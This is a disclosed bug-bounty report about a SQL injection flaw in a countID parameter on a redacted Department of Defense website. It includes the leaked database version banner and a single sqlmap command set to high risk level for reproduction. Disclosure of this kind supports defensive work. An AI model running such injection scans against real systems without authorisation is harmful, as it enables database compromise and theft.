---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '390879'
original_report_id: '390879'
title: SQL Injection on www.██████████ on countID parameter
weakness: SQL Injection
team_handle: deptofdefense
created_at: '2018-08-06T12:03:16.573Z'
disclosed_at: '2019-10-08T18:46:15.286Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 79
tags:
- hackerone
- sql-injection
---

# SQL Injection on www.██████████ on countID parameter

## Metadata

- HackerOne Report ID: 390879
- Weakness: SQL Injection
- Program: deptofdefense
- Disclosed At: 2019-10-08T18:46:15.286Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

**Description:**
Hello Team,
I have came across a sql injection vulnerability on www.██████ on countID parameter. I was able to retrieve the banner which is

> Microsoft SQL Server 2008 R2 (SP3) - 10.50.6220.0 (X64& 
	Mar 19 2015 12:32:14 
	Copyright (c) Microsoft Corporation
	Standard Edition (64-bit) on Windows NT 6.3 <X64> (Build 9600: ) (Hypervisor)

after confirming the vulnerability i have stopped testing further.

**Vulnerable URL:**
https://www.███/public/saveCount.cfm?countID=4

**Steps to Reproduce:**
1. python sqlmap.py -u https://www.██████████/public/saveCount.cfm?countID=4 --level=3 --risk=3 

**POC**
█████████

## Impact

Attacker can take control over the database server.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
